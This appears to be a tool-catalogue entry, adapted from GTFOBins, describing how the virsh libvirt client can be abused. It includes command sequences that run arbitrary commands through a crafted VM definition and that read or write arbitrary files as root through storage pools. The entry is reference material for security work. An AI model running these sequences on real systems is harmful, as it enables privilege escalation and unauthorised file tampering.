---
id: virtualization-libvirt-virsh
namespace: virtualization:libvirt:virsh
name: virsh
description: Libvirt shell for managing virtual machines; can execute commands and
  spawn shells.
author: GTFOBins
version: 1.0.0
capabilities:
- security.execution.command
- system.file.write
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- virsh
parameters: []
features:
- file-system
- interactive
- local
- pipes-stdin
- process-manip
execution:
  template: virsh
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Execute arbitrary commands (sudo)
  command: "cat >/path/to/temp-file.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n\
    \  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n\
    \  <devices>\n    <interface type='ethernet'>\n      <script path='/path/to/command'/>\n\
    \    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create\
    \ /path/to/temp-file.xml\nvirsh -c qemu:///system destroy x"
- description: Write to arbitrary files (sudo, unprivileged)
  command: "echo DATA >/path/to/temp-file\n\ncat >/path/to/temp-file.xml <<EOF\n<volume\
    \ type='file'>\n  <name>y</name>\n  <key>/path/to/output-dir/output-file</key>\n\
    \  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation\
    \ unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n\
    \    <path>/path/to/output-dir/output-file</path>\n    <format type='raw'/>\n\
    \    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n\
    \    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as\
    \ x dir --target /path/to/output-dir/\nvirsh -c qemu:///system vol-create --pool\
    \ x --file /path/to/temp-file.xml\nvirsh -c qemu:///system vol-upload --pool x\
    \ /path/to/output-dir/output-file /path/to/temp-file\nvirsh -c qemu:///system\
    \ pool-destroy x"
- description: Write to arbitrary files (sudo, unprivileged)
  command: 'virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/

    virsh -c qemu:///system vol-download --pool x input-file output-file

    virsh -c qemu:///system pool-destroy x'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/virsh/
techniques:
- execution
- collection
- exfiltration
install:
- method: apt
  package_name: libvirt-clients
  commands:
  - apt-get install -y libvirt-clients
---

# virsh

virsh is a command-line utility. Libvirt shell for managing virtual machines; can also execute arbitrary commands, write to arbitrary files.
